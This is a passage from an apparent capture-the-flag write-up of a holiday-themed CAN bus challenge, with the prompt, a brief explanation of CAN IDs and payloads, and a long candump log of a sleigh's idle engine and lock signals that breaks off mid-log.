MMMMMMMMMMMMMMMMMMMMMMMMMMMMMWX00OkxxddcddxxkOO0XWMMMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMMMMMMMMMMMMMMMMMMWXOxoc:c.;cccccc.ccccc:.:c:ldxOXMMMMMMMMMMMMMMMMMMMMMMM MMMMMMMMMMMMMMMMMMMMXkoc',ccccc:.:ccccc.ccccc.;cccc,'::cdOXMMMMMMMMMMMMMMMMMMM MMMMMMMMMMMMMMMMM0xc:cccc,':cccc::ccccccccccccccc:.;cccccc:lxXMMMMMMMMMMMMMMMM MMMMMMMMMMMMMMNkl,',:ccccc;;ccccccccccccccccccccc::cccccc:,',:lOWMMMMMMMMMMMMM MMMMMMMMMMMMNxccccc;';cccccccccccccccccccccccccccccccccc;':cccccckWMMMMMMMMMMM MMMMMMMMMMNdcccccc:..;cccccccccccccccccccccccccccccccccccccccccccc:kWMMMMMMMMM MMMMMMMMM0c,,,,:cccc;..;cccccccccccccccccccccccccccccccccccccc:,,,;:lKMMMMMMMM MMMMMMMWd:cccc;:cccccc;..,cccccccccccccccccccccccccccccccccccc;:cccccckMMMMMMM MMMMMMNlcccccccccccccccc:..,:ccccccccccccccccccccccccccccccccccccccccc:oWMMMMM MMMMMNc,,,,,:ccccccccccccc:..':cccccccccccccccccccccccccccccccccc:,,,,,;oWMMMM MMMMWoccccc::ccccccccccccccc:'.':cccccccccccccccccccccccccccccccc::ccccccxMMMM MMMMkccccccccccccccccccccccccc:'..:cccccccccccccccccccccccccccccccccccccc:0MMM MMMN::cccccccccccccccccccccccccc:'..:cccccccccccccccccccccccccccccccccccc:cWMM MMMk,,,,,:cccccccccccccccccccccccc:,..;ccccccccccccccccccccccccccccc:,,,,,;0MM MMMlccccccccccccccccccccccccccccccccc,.;cccccccccccccccccccccccccccccccccccdMM MMW:ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccclMM MMWOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0MM MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM Welcome to the CAN bus terminal challenge! In your home folder, there's a CAN bus capture from Santa's sleigh. Some of the data has been cleaned up, so don't worry - it isn't too noisy. What you will see is a record of the engine idling up and down. Also in the data are a LOCK signal, an UNLOCK signal, and one more LOCK. Can you find the UNLOCK? We'd like to encode another key mechanism. Find the decimal portion of the timestamp of the UNLOCK code in candump.log and submit it to ./runtoanswer! (e.g., if the timestamp is 123456.112233, please submit 112233) elf@ae8dbb83f303:~$ Solution Each message on the CAN bus has a CAN ID and a corresponding chunk of data. Messages that share the same functionality share a CAN ID and differ with the data. E.g. If lock/unlock share CAN ID 0x17A, a lock signal may send the message 0x17A:0000 0000, whereas an unlock signal may send the message 0x17A:0000 0001. Size of data vary based on message and manufacturer's dialect of CAN. We may be able to figure out the messages by looking at the CAN IDs and data chunks. Let's look at the CAN bus capture elf@ad71dd1d0e69:~$ ls -l total 516 -rwxr-xr-x 1 root root 56065 Dec 5 00:00 candump.log -rws--x--x 1 root root 469136 Dec 5 00:00 runtoanswer elf@ad71dd1d0e69:~$ cat candump.log (1608926660.800530) vcan0 244#0000000116 (1608926660.812774) vcan0 244#00000001D3 (1608926660.826327) vcan0 244#00000001A6 (1608926660.839338) vcan0 244#00000001A3 (1608926660.852786) vcan0 244#00000001B4 (1608926660.866754) vcan0 244#000000018E (1608926660.879825) vcan0 244#000000015F (1608926660.892934) vcan0 244#0000000103 (1608926660.904816) vcan0 244#0000000181 (1608926660.920799) vcan0 244#000000015F (1608926660.934338) vcan0 244#0000000173 (1608926660.946952) vcan0 244#0000000183 (1608926660.962926) vcan0 244#0000000149 (1608926660.970738) vcan0 188#00000000 (1608926660.977487) vcan0 244#00000001E0 (1608926660.989792) vcan0 244#00000001D6 (1608926661.002690) vcan0 244#0000000145 (1608926661.018189) vcan0 244#00000001E9 (1608926661.031261) vcan0 244#00000001F9 (1608926661.042719) vcan0 244#0000000185 (1608926661.053863) vcan0 244#00000001AB (1608926661.066551) vcan0 244#00000001E0 (1608926661.079120) vcan0 244#0000000157 (1608926661.092179) vcan0 244#00000001BD (1608926661.105503) vcan0 244#0000000188 (1608926661.120710) vcan0 244#0000000189 (1608926661.133553) vcan0 244#00000001C0 (1608926661.145725) vcan0 244#000000019E (1608926661.158666) vcan0 244#00000001E3 (1608926661.173070) vcan0 244#0000000123 (1608926661.184569) vcan0 244#00000001FC (1608926661.195901) vcan0 244#00000001C0 (1608926661.209364) vcan0 244#0000000155 (1608926661.220631) vcan0 244#00000001EB (1608926661.233510) vcan0 244#0000000182 (1608926661.245964) vcan0 244#0000000195 (1608926661.258201) vcan0 244#000000013B (1608926661.271293) vcan0 244#000000012B (1608926661.285172) vcan0 244#0000000191 (1608926661.297488) vcan0 244#000000015A (1608926661.309332) vcan0 244#0000000148 (1608926661.322653) vcan0 244#000000018E (1608926661.336724) vcan0 244#00000001EA (1608926661.348576) vcan0 244#00000001E7 (1608926661.361548) vcan0 244#0000000174 (1608926661.373583) vcan0 244#0000000167 (1608926661.385352) vcan0 244#0000000159 (1608926661.400643) vcan0 244#00000001D5 (1608926661.413712) vcan0 244#00000001ED (1608926661.426704) vcan0 244#000000016F (1608926661.440028) vcan0 244#00000001F7 (1608926661.454952) vcan0 244#00000001B4 (1608926661.467504) vcan0 244#00000001EC (1608926661.474018) vcan0 188#00000000 (1608926661.497162) vcan0 244#00000001EB (1608926661.509848) vcan0 244#000000010D (1608926661.522866) vcan0 244#0000000110 (1608926661.535661) vcan0 244#0000000110 (1608926661.548001) vcan0 244#000000016A (1608926661.563643) vcan0 244#00000001CA (1608926661.576051) vcan0 244#0000000110 (1608926661.589781) vcan0 244#00000001A9 (1608926661.602554) vcan0 244#00000001E2 (1608926661.614449) vcan0 244#00000001EC (1608926661.626380) vcan0 244#000000019B (1608926661.638457) vcan0 244#000000016B (1608926661.651923) vcan0 244#000000018A (1608926661.664353) vcan0 244#00000001CD (1608926661.676152) vcan0 244#00000001C2 (1608926661.688046) vcan0 244#0000000151 (1608926661.700350) vcan0 244#000000017A (1608926661.711897) vcan0 244#0000000139 (1608926661.723848) vcan0 244#0000000137 (1608926661.736140) vcan0 244#00000001A4 (1608926661.752191) vcan0 244#00000001C0 (1608926661.764946) vcan0 244#000000013A (1608926661.779049) vcan0 244#0000000133 (1608926661.793280) vcan0 244#0000000142 (1608926661.806615) vcan0 244#00000001B1 (1608926661.819373) vcan0 244#00000001A6 (1608926661.838732) vcan0 244#000000014B (1608926661.854134) vcan0 244#00000001BC (1608926661.869750) vcan0 244#00000001B9 (1608926661.887153) vcan0 244#000000019D (1608926661.899482) vcan0 244#00000001C4 (1608926661.911868) vcan0 244#0000000140 (1608926661.925341) vcan0 244#0000000146 (1608926661.938001) vcan0 244#00000001F0 (1608926661.950637) vcan0 244#000000016E (1608926661.963780) vcan0 244#00000001CD (1608926661.978084) vcan0 244#0000000157 (1608926661.978259) vcan0 188#00000000 (1608926661.992728) vcan0 244#000000019A (1608926662.005645) vcan0 244#0000000192 (1608926662.019680) vcan0 244#0000000155 (1608926662.049874) vcan0 244#0000000122 (1608926662.066645) vcan0 244#00000001CA (1608926662.077366) vcan0 244#00000001DC (1608926662.092455) vcan0 244#0000000148 (1608926662.107014) vcan0 244#00000001B3 (1608926662.120549) vcan0 244#000000013B (1608926662.135345) vcan0 244#0000000136 (1608926662.147581) vcan0 244#00000001C9 (1608926662.159970) vcan0 244#0000000191 (1608926662.300822) vcan0 244#000000018A (1608926662.314962) vcan0 244#000000018A (1608926662.327004) vcan0 244#00000001ED (1608926662.338878) vcan0 244#0000000161 (1608926662.351935) vcan0 244#00000001D9 (1608926662.363852) vcan0 244#000000014B (1608926662.375649) vcan0 244#00000001AF (1608926662.390980) vcan0 244#000000019B (1608926662.405242) vcan0 244#0000000134 (1608926662.420102) vcan0 244#0000000187 (1608926662.432350) vcan0 244#00000001F0 (1608926662.445774) vcan0 244#000000016E (1608926662.457836) vcan0 244#00000001E8 (1608926662.472519) vcan0 244#000000014D (1608926662.478577) vcan0 188#00000000 (1608926662.484790) vcan0 244#00000001D0 (1608926662.497708) vcan0 244#0000000175 (1608926662.511038) vcan0 244#0000000157 (1608926662.525266) vcan0 244#00000001B9 (1608926662.539122) vcan0 244#00000001E8 (1608926662.551746) vcan0 244#000000018E (1608926662.565696) vcan0 244#00000001E8 (1608926662.580454) vcan0 244#000000015A (1608926662.594779) vcan0 244#00000001CC (1608926662.606767) vcan0 244#00000001CE (1608926662.618856) vcan0 244#00000001D3 (1608926662.633226) vcan0 244#0000000130 (1608926662.646379) vcan0 244#000000011D (1608926662.659207) vcan0 244#000000012A (1608926662.672728) vcan0 244#0000000103 (1608926662.685353) vcan0 244#0000000102 (1608926662.698549) vcan0 244#0000000157 (1608926662.710804) vcan0 244#00000001AA (1608926662.724739) vcan0 244#00000001A8 (1608926662.736974) vcan0 244#0000000160 (1608926662.751613) vcan0 244#0000000127 (1608926662.764767) vcan0 244#000000011E (1608926662.776498) vcan0 244#0000000149 (1608926662.791623) vcan0 244#00000001F2 (1608926662.804769) vcan0 244#0000000155 (1608926662.818963) vcan0 244#000000011A (1608926662.833047) vcan0 244#0000000115 (1608926662.847319) vcan0 244#0000000162 (1608926662.862998) vcan0 244#0000000012 (1608926662.875880) vcan0 244#0000000024 (1608926662.888347) vcan0 244#0000000036 (1608926662.901322) vcan0 244#0000000048 (1608926662.914148) vcan0 244#000000005A (1608926662.925055) vcan0 244#000000006C (1608926662.938107) vcan0 244#000000007E (1608926662.950328) vcan0 244#0000000090 (1608926662.962629) vcan0 244#00000000A2 (1608926662.977599) vcan0 244#00000000B5 (1608926662.977733) vcan0 188#00000000 (1608926662.992760) vcan0 244#00000000C7 (1608926663.011800) vcan0 244#00000000D9 (1608926663.019913) vcan0 244#00000000EB (1608926663.036065) vcan0 244#00000000FD (1608926663.050314) vcan0 244#000000010F (1608926663.084956) vcan0 244#0000000121 (1608926663.095873) vcan0 244#0000000133 (1608926663.108499) vcan0 244#0000000145 (1608926663.121307) vcan0 244#0000000157 (1608926663.134884) vcan0 244#000000016A (1608926663.148361) vcan0 244#000000017C (1608926663.163176) vcan0 244#000000018E (1608926663.175988) vcan0 244#00000001A0 (1608926663.188715) vcan0 244#00000001B2 (1608926663.202484) vcan0 244#00000001C4 (1608926663.217094) vcan0 244#00000001D6 (1608926663.229824) vcan0 244#00000001E8 (1608926663.241816) vcan0 244#00000001FA (1608926663.253274) vcan0 244#000000020D (1608926663.266142) vcan0 244#000000021F (1608926663.279655) vcan0 244#0000000231 (1608926663.291745) vcan0 244#0000000243 (1608926663.306737) vcan0 244#0000000255 (1608926663.320910) vcan0 244#0000000267 (1608926663.335251) vcan0 244#0000000279 (1608926663.348101) vcan0 244#000000028B (1608926663.363482) vcan0 244#000000029D (1608926663.375607) vcan0 244#00000002AF (1608926663.389393) vcan0 244#00000002C2 (1608926663.402386) vcan0 244#00000002D4 (1608926663.414124) vcan0 244#00000002E6 (1608926663.427578) vcan0 244#00000002F8 (1608926663.441733) vcan0 244#000000030A (1608926663.456844) vcan0 244#000000031C (1608926663.469394) vcan0 244#000000032E (1608926663.482409) vcan0 244#0000000340 (1608926663.483216) vcan0 188#00000000 (1608926663.496846) vcan0 244#0000000352 (1608926663.508878) vcan0 244#0000000365 (1608926663.525275) vcan0 244#0000000377 (1608926663.539046) vcan0 244#0000000389 (1608926663.552461) vcan0 244#000000039B (1608926663.566030) vcan0 244#00000003AD (1608926663.578939) vcan0 244#00000003BF (1608926663.593612) vcan0 244#00000003D1 (1608926663.607026) vcan0 244#00000003E3 (1608926663.618775) vcan0 244#00000003F5 (1608926663.634185) vcan0 244#0000000407 (1608926663.647690) vcan0 244#000000041A (1608926663.660523) vcan0 244#000000042C (1608926663.675005) vcan0 244#000000043E (1608926663.688833) vcan0 244#0000000450 (1608926663.699880) vcan0 244#0000000462 (1608926663.712198) vcan0 244#0000000474 (1608926663.724508) vcan0 244#0000000486 (1608926663.736229) vcan0 244#0000000498 (1608926663.748694) vcan0 244#00000004AA (1608926663.762446) vcan0 244#00000004BD (1608926663.776172) vcan0 244#00000004CF (1608926663.791213) vcan0 244#00000004E1 (1608926663.804979) vcan0 244#00000004F3 (1608926663.821508) vcan0 244#0000000505 (1608926663.834550) vcan0 244#0000000517 (1608926663.848430) vcan0 244#0000000529 (1608926663.861471) vcan0 244#000000053B (1608926663.876565) vcan0 244#000000054D (1608926663.889607) vcan0 244#000000055F (1608926663.902160) vcan0 244#0000000572 (1608926663.916553) vcan0 244#0000000584 (1608926663.929340) vcan0 244#0000000596 (1608926663.942516) vcan0 244#00000005A8 (1608926663.955049) vcan0 244#00000005BA (1608926663.968577) vcan0 244#00000005CC (1608926663.981517) vcan0 244#00000005DE (1608926663.989726) vcan0 188#00000000 (1608926663.998660) vcan0 244#00000005F0 (1608926664.020416) vcan0 244#0000000602 (1608926664.036324) vcan0 244#0000000615 (1608926664.057593) vcan0 244#0000000627 (1608926664.078890) vcan0 244#0000000639 (1608926664.094480) vcan0 244#000000064B (1608926664.128465) vcan0 244#000000065D (1608926664.161405) vcan0 244#000000066F (1608926664.173912) vcan0 244#0000000681 (1608926664.186034) vcan0 244#0000000693 (1608926664.197777) vcan0 244#00000006A5 (1608926664.210633) vcan0 244#00000006B7 (1608926664.222200) vcan0 244#00000006CA (1608926664.235982) vcan0 244#00000006DC (1608926664.247990) vcan0 244#00000006EE (1608926664.264136) vcan0 244#0000000700 (1608926664.277038) vcan0 244#0000000712 (1608926664.290232) vcan0 244#0000000724 (1608926664.304080) vcan0 244#0000000736 (1608926664.319201) vcan0 244#0000000748 (1608926664.332318) vcan0 244#000000075A (1608926664.346533) vcan0 244#000000076D (1608926664.359862) vcan0 244#000000077F (1608926664.371866) vcan0 244#0000000791 (1608926664.384379) vcan0 244#00000007A3 (1608926664.397970) vcan0 244#00000007B5 (1608926664.409742) vcan0 244#00000007C7 (1608926664.421955) vcan0 244#00000007D9 (1608926664.433653) vcan0 244#00000007EB (1608926664.445598) vcan0 244#00000007FD (1608926664.457825) vcan0 244#000000080F (1608926664.469800) vcan0 244#0000000822 (1608926664.484453) vcan0 244#0000000834 (1608926664.491259) vcan0 188#00000000 (1608926664.498188) vcan0 244#0000000846 (1608926664.512142) vcan0 244#0000000858 (1608926664.523899) vcan0 244#000000086A (1608926664.538077) vcan0 244#000000087C (1608926664.552689) vcan0 244#000000088E (1608926664.568050) vcan0 244#00000008A0 (1608926664.582114) vcan0 244#00000008B2 (1608926664.595860) vcan0 244#00000008C5 (1608926664.608634) vcan0 244#00000008D7 (1608926664.623887) vcan0 244#00000008E9 (1608926664.626448) vcan0 19B#000000000000 (1608926664.635745) vcan0 244#00000008FB (1608926664.647559) vcan0 244#000000090D (1608926664.661009) vcan0 244#000000091F (1608926664.673421) vcan0 244#0000000931 (1608926664.686012) vcan0 244#0000000943 (1608926664.698832) vcan0 244#0000000955 (1608926664.712077) vcan0 244#0000000967 (1608926664.725623) vcan0 244#000000097A (1608926664.738804) vcan0 244#000000098C (1608926664.751359) vcan0 244#000000099E (1608926664.763545) vcan0 244#00000009B0 (1608926664.777448) vcan0 244#00000009C2 (1608926664.791887) vcan0 244#00000009D4 (1608926664.804779) vcan0 244#00000009E6 (1608926664.817468) vcan0 244#00000009F8 (1608926664.831084) vcan0 244#0000000A0A (1608926664.844710) vcan0 244#0000000A1D (1608926664.857410) vcan0 244#0000000A2F (1608926664.871109) vcan0 244#0000000A41 (1608926664.884847) vcan0 244#0000000A53 (1608926664.897191) vcan0 244#0000000A65 (1608926664.909212) vcan0 244#0000000A77 (1608926664.922841) vcan0 244#0000000A89 (1608926664.935527) vcan0 244#0000000A9B (1608926664.947798) vcan0 244#0000000AAD (1608926664.961673) vcan0 244#0000000ABF (1608926664.974470) vcan0 244#0000000AD2 (1608926664.989125) vcan0 244#0000000AE4 (1608926664.996093) vcan0 188#00000000 (1608926665.010315) vcan0 244#0000000AF6 (1608926665.025938) vcan0 244#0000000B08 (1608926665.042230) vcan0 244#0000000B1A (1608926665.050576) vcan0 244#0000000B2C (1608926665.064938) vcan0 244#0000000B3E (1608926665.079511) vcan0 244#0000000B50 (1608926665.092246) vcan0 244#0000000B62 (1608926665.106383) vcan0 244#0000000B75 (1608926665.119228) vcan0 244#0000000B87 (1608926665.132860) vcan0 244#0000000B99 (1608926665.147306) vcan0 244#0000000BAB (1608926665.161820) vcan0 244#0000000BBD (1608926665.175060) vcan0 244#0000000BCF (1608926665.189888) vcan0 244#0000000BE1 (1608926665.204797) vcan0 244#0000000BF3 (1608926665.219216) vcan0 244#0000000C05 (1608926665.232862) vcan0 244#0000000C17 (1608926665.246496) vcan0 244#0000000C2A (1608926665.259009) vcan0 244#0000000C3C (1608926665.271042) vcan0 244#0000000C4E (1608926665.285321) vcan0 244#0000000C60 (1608926665.299198) vcan0 244#0000000C72 (1608926665.312034) vcan0 244#0000000C84 (1608926665.325972) vcan0 244#0000000C96 (1608926665.339844) vcan0 244#0000000CA8 (1608926665.353596) vcan0 244#0000000CBA (1608926665.367323) vcan0 244#0000000CCD (1608926665.380032) vcan0 244#0000000CDF (1608926665.393884) vcan0 244#0000000CF1 (1608926665.407106) vcan0 244#0000000D03 (1608926665.421574) vcan0 244#0000000D15 (1608926665.434151) vcan0 244#0000000D27 (1608926665.446509) vcan0 244#0000000D39 (1608926665.459320) vcan0 244#0000000D4B (1608926665.472658) vcan0 244#0000000D5D (1608926665.485048) vcan0 244#0000000D6F (1608926665.498823) vcan0 244#0000000D82 (1608926665.499007) vcan0 188#00000000 (1608926665.511558) vcan0 244#0000000D94 (1608926665.523837) vcan0 244#0000000DA6 (1608926665.537455) vcan0 244#0000000DB8 (1608926665.551709) vcan0 244#0000000DCA (1608926665.563573) vcan0 244#0000000DDC (1608926665.576273) vcan0 244#0000000DEE (1608926665.589820) vcan0 244#0000000E00 (1608926665.602756) vcan0 244#0000000E12 (1608926665.617774) vcan0 244#0000000E24 (1608926665.633061) vcan0 244#0000000E37 (1608926665.646454) vcan0 244#0000000E49 (1608926665.659637) vcan0 244#0000000E5B (1608926665.674159) vcan0 244#0000000E6D (1608926665.687478) vcan0 244#0000000E7F (1608926665.699855) vcan0 244#0000000E91 (1608926665.713405) vcan0 244#0000000EA3 (1608926665.729998) vcan0 244#0000000EB5 (1608926665.742669) vcan0 244#0000000EC7 (1608926665.756448) vcan0 244#0000000EDA (1608926665.768203) vcan0 244#0000000EEC (1608926665.781218) vcan0 244#0000000EFE (1608926665.797186) vcan0 244#0000000F10 (1608926665.809704) vcan0 244#0000000F22 (1608926665.824233) vcan0 244#0000000F34 (1608926665.837554) vcan0 244#0000000F46 (1608926665.849683) vcan0 244#0000000F58 (1608926665.863475) vcan0 244#0000000F6A (1608926665.876267) vcan0 244#0000000F7C (1608926665.890399) vcan0 244#0000000F8F (1608926665.903908) vcan0 244#0000000FA1 (1608926665.917009) vcan0 244#0000000FB3 (1608926665.929606) vcan0 244#0000000FC5 (1608926665.942412) vcan0 244#0000000FD7 (1608926665.956432) vcan0 244#0000000FE9 (1608926665.970580) vcan0 244#0000000FFB (1608926665.983752) vcan0 244#000000100D (1608926666.000070) vcan0 244#000000101F (1608926666.009849) vcan0 244#0000001032 (1608926666.009926) vcan0 188#00000000 (1608926666.024054) vcan0 244#0000001044 (1608926666.039577) vcan0 244#0000001056 (1608926666.048316) vcan0 244#0000001068 (1608926666.061635) vcan0 244#000000107A (1608926666.075431) vcan0 244#000000108C (1608926666.088018) vcan0 244#000000109E (1608926666.100922) vcan0 244#00000010B0 (1608926666.114527) vcan0 244#00000010C2 (1608926666.126482) vcan0 244#00000010D4 (1608926666.140020) vcan0 244#00000010E7 (1608926666.153537) vcan0 244#00000010F9 (1608926666.167921) vcan0 244#000000110B (1608926666.181639) vcan0 244#000000111D (1608926666.195192) vcan0 244#000000112F (1608926666.206892) vcan0 244#0000001141 (1608926666.220209) vcan0 244#0000001153 (1608926666.232867) vcan0 244#0000001165 (1608926666.244841) vcan0 244#0000001177 (1608926666.260051) vcan0 244#000000118A (1608926666.277286) vcan0 244#000000119C (1608926666.290863) vcan0 244#00000011AE (1608926666.304918) vcan0 244#00000011C0 (1608926666.317809) vcan0 244#00000011D2 (1608926666.331887) vcan0 244#00000011E4 (1608926666.343966) vcan0 244#00000011F6 (1608926666.360417) vcan0 244#0000001208 (1608926666.381721) vcan0 244#000000121A (1608926666.393288) vcan0 244#000000122C (1608926666.406241) vcan0 244#000000123F (1608926666.419322) vcan0 244#0000001251 (1608926666.431681) vcan0 244#0000001263 (1608926666.451026) vcan0 244#0000001275 (1608926666.464794) vcan0 244#0000001287 (1608926666.478499) vcan0 244#0000001299 (1608926666.491986) vcan0 244#00000012AB (1608926666.506388) vcan0 244#00000012BD (1608926666.512371) vcan0 188#00000000 (1608926666.518466) vcan0 244#00000012CF (1608926666.530123) vcan0 244#00000012E2 (1608926666.542339) vcan0 244#00000012F4 (1608926666.556583) vcan0 244#0000001306 (1608926666.569917) vcan0 244#0000001318 (1608926666.581029) vcan0 244#000000132A (1608926666.594331) vcan0 244#000000133C (1608926666.607171) vcan0 244#000000134E (1608926666.623528) vcan0 244#0000001360 (1608926666.638805) vcan0 244#0000001372 (1608926666.651844) vcan0 244#0000001384 (1608926666.669536) vcan0 244#0000001397 (1608926666.682218) vcan0 244#00000013A9 (1608926666.695626) vcan0 244#00000013BB (1608926666.708564) vcan0 244#00000013CD (1608926666.721031) vcan0 244#00000013DF (1608926666.735641) vcan0 244#00000013F1 (1608926666.748140) vcan0 244#0000001403 (1608926666.760552) vcan0 244#0000001415 (1608926666.772413) vcan0 244#0000001427 (1608926666.784548) vcan0 244#000000143A (1608926666.795981) vcan0 244#000000144C (1608926666.807776) vcan0 244#000000145E (1608926666.820304) vcan0 244#0000001470 (1608926666.832901) vcan0 244#0000001482 (1608926666.850950) vcan0 244#0000001494 (1608926666.863172) vcan0 244#00000014A6 (1608926666.874937) vcan0 244#00000014B8 (1608926666.888715) vcan0 244#00000014CA (1608926666.900996) vcan0 244#00000014DC (1608926666.914338) vcan0 244#00000014EF (1608926666.925659) vcan0 244#0000001501 (1608926666.937843) vcan0 244#0000001513 (1608926666.950368) vcan0 244#0000001525 (1608926666.963823) vcan0 244#0000001537 (1608926666.978921) vcan0 244#0000001549 (1608926666.997692) vcan0 244#000000155B (1608926667.013303) vcan0 244#000000156D (1608926667.013385) vcan0 188#00000000 (1608926667.032531) vcan0 244#000000157F (1608926667.049236) vcan0 244#0000001592 (1608926667.065330) vcan0 244#00000015A4 (1608926667.081881) vcan0 244#00000015B6 (1608926667.098395) vcan0 244#00000015C8 (1608926667.112199) vcan0 244#00000015DA (1608926667.126197) vcan0 244#00000015EC (1608926667.140148) vcan0 244#00000015FE (1608926667.152769) vcan0 244#0000001610 (1608926667.165707) vcan0 244#0000001622 (1608926667.178629) vcan0 244#0000001634 (1608926667.191677) vcan0 244#0000001647 (1608926667.204217) vcan0 244#0000001659 (1608926667.217847) vcan0 244#000000166B (1608926667.231315) vcan0 244#000000167D (1608926667.245347) vcan0 244#000000168F (1608926667.259254) vcan0 244#00000016A1 (1608926667.271657) vcan0 244#00000016B3 (1608926667.284136) vcan0 244#00000016C5 (1608926667.297701) vcan0 244#00000016D7 (1608926667.311626) vcan0 244#00000016EA (1608926667.325463) vcan0 244#00000016FC (1608926667.337766) vcan0 244#000000170E (1608926667.350367) vcan0 244#0000001720 (1608926667.363496) vcan0 244#0000001732 (1608926667.376008) vcan0 244#0000001744 (1608926667.389773) vcan0 244#0000001756 (1608926667.402708) vcan0 244#0000001768 (1608926667.415924) vcan0 244#000000177A (1608926667.428075) vcan0 244#000000178C (1608926667.442296) vcan0 244#000000179F (1608926667.453613) vcan0 244#00000017B1 (1608926667.467184) vcan0 244#00000017C3 (1608926667.481775) vcan0 244#00000017D5 (1608926667.494631) vcan0 244#00000017E7 (1608926667.507234) vcan0 244#00000017F9 (1608926667.520158) vcan0 244#000000180B (1608926667.520201) vcan0 188#00000000 (1608926667.532004) vcan0 244#000000181D (1608926667.544029) vcan0 244#000000182F (1608926667.557966) vcan0 244#0000001841 (1608926667.571141) vcan0 244#0000001854 (1608926667.583068) vcan0 244#0000001866 (1608926667.595472) vcan0 244#0000001878 (1608926667.607968) vcan0 244#000000188A (1608926667.620688) vcan0 244#000000189C (1608926667.632910) vcan0 244#00000018AE (1608926667.646229) vcan0 244#00000018C0 (1608926667.658173) vcan0 244#00000018D2 (1608926667.671161) vcan0 244#00000018E4 (1608926667.686081) vcan0 244#00000018F7 (1608926667.699322) vcan0 244#0000001909 (1608926667.712494) vcan0 244#000000191B (1608926667.724046) vcan0 244#000000192D (1608926667.737315) vcan0 244#000000193F (1608926667.754557) vcan0 244#0000001951 (1608926667.772404) vcan0 244#0000001963 (1608926667.785119) vcan0 244#0000001975 (1608926667.799447) vcan0 244#0000001987 (1608926667.812428) vcan0 244#0000001999 (1608926667.824938) vcan0 244#00000019AC (1608926667.837300) vcan0 244#00000019BE (1608926667.849350) vcan0 244#00000019D0 (1608926667.863374) vcan0 244#00000019E2 (1608926667.880747) vcan0 244#00000019F4 (1608926667.894983) vcan0 244#0000001A06 (1608926667.908768) vcan0 244#0000001A18 (1608926667.922387) vcan0 244#0000001A2A (1608926667.934650) vcan0 244#0000001A3C (1608926667.948235) vcan0 244#0000001A4F (1608926667.961636) vcan0 244#0000001A61 (1608926667.976630) vcan0 244#0000001A73 (1608926667.989755) vcan0 244#0000001A85 (1608926668.007205) vcan0 244#0000001A97 (1608926668.022718) vcan0 244#0000001AA9 (1608926668.022800) vcan0 188#00000000 (1608926668.034742) vcan0 244#0000001ABB (1608926668.047299) vcan0 244#0000001ACD (1608926668.062827) vcan0 244#0000001ADF (1608926668.075039) vcan0 244#0000001AF1 (1608926668.088475) vcan0 244#0000001B04 (1608926668.100045) vcan0 244#0000001B16 (1608926668.112133) vcan0 244#0000001B28 (1608926668.124152) vcan0 244#0000001B3A (1608926668.136430) vcan0 244#0000001B4C (1608926668.149044) vcan0 244#0000001B5E (1608926668.165051) vcan0 244#0000001B70 (1608926668.177303) vcan0 244#0000001B82 (1608926668.188838) vcan0 244#0000001B94 (1608926668.201136) vcan0 244#0000001BA7 (1608926668.212991) vcan0 244#0000001BB9 (1608926668.225218) vcan0 244#0000001BCB (1608926668.237669) vcan0 244#0000001BDD (1608926668.252777) vcan0 244#0000001BEF (1608926668.266329) vcan0 244#0000001C01 (1608926668.281019) vcan0 244#0000001C13 (1608926668.293830) vcan0 244#0000001C25 (1608926668.308965) vcan0 244#0000001C37 (1608926668.321655) vcan0 244#0000001C49 (1608926668.335800) vcan0 244#0000001C5C (1608926668.348471) vcan0 244#0000001C6E (1608926668.362930) vcan0 244#0000001C80 (1608926668.375721) vcan0 244#0000001C92 (1608926668.387869) vcan0 244#0000001CA4 (1608926668.401207) vcan0 244#0000001CB6 (1608926668.412876) vcan0 244#0000001CC8 (1608926668.424010) vcan0 244#0000001CDA (1608926668.435736) vcan0 244#0000001CEC (1608926668.448417) vcan0 244#0000001CFF (1608926668.461467) vcan0 244#0000001D11 (1608926668.473596) vcan0 244#0000001D23 (1608926668.485834) vcan0 244#0000001D35 (1608926668.498150) vcan0 244#0000001D47 (1608926668.510172) vcan0 244#0000001D59 (1608926668.523816) vcan0 244#0000001D6B (1608926668.530024) vcan0 188#00000000 (1608926668.537152) vcan0 244#0000001D7D (1608926668.550302) vcan0 244#0000001D8F (1608926668.562053) vcan0 244#0000001DA1 (1608926668.574099) vcan0 244#0000001DB4 (1608926668.586497) vcan0 244#0000001DC6 (1608926668.598185) vcan0 244#0000001DD8 (1608926668.610208) vcan0 244#0000001DEA (1608926668.622159) vcan0 244#0000001DFC (1608926668.634065) vcan0 244#0000001E0E (1608926668.645574) vcan0 244#0000001E20 (1608926668.658760) vcan0 244#0000001E32 (1608926668.670324) vcan0 244#0000001E44 (1608926668.682420) vcan0 244#0000001E57 (1608926668.694570) vcan0 244#0000001E69 (1608926668.706433) vcan0 244#0000001E7B (1608926668.718612) vcan0 244#0000001E8D (1608926668.731791) vcan0 244#0000001E9F (1608926668.744984) vcan0 244#0000001EB1 (1608926668.759171) vcan0 244#0000001EC3 (1608926668.774006) vcan0 244#0000001ED5 (1608926668.789911) vcan0 244#0000001EE7 (1608926668.805444) vcan0 244#0000001EF9 (1608926668.820035) vcan0 244#0000001F0C (1608926668.832804) vcan0 244#0000001F1E (1608926668.846185) vcan0 244#0000001F30 (1608926668.864609) vcan0 244#0000001F42 (1608926668.878660) vcan0 244#0000001F54 (1608926668.892376) vcan0 244#0000001F66 (1608926668.908891) vcan0 244#0000001F78 (1608926668.921480) vcan0 244#0000001F8A (1608926668.934413) vcan0 244#0000001F9C (1608926668.947002) vcan0 244#0000001FAF (1608926668.959289) vcan0 244#0000001FC1 (1608926668.972189) vcan0 244#0000001FD3 (1608926668.984094) vcan0 244#0000001FE5 (1608926668.997354) vcan0 244#0000001FF7 (1608926669.008884) vcan0 244#0000002009 (1608926669.022318) vcan0 244#000000201B (1608926669.036721) vcan0 244#000000202D (1608926669.036851) vcan0 188#00000000 (1608926669.048687) vcan0 244#000000203F (1608926669.063756) vcan0 244#0000002051 (1608926669.076301) vcan0 244#0000002064 (1608926669.088757) vcan0 244#0000002076 (1608926669.102290) vcan0 244#0000002088 (1608926669.118028) vcan0 244#000000209A (1608926669.130185) vcan0 244#00000020AC (1608926669.142715) vcan0 244#00000020BE (1608926669.155210) vcan0 244#00000020D0 (1608926669.167820) vcan0 244#00000020E2 (1608926669.180667) 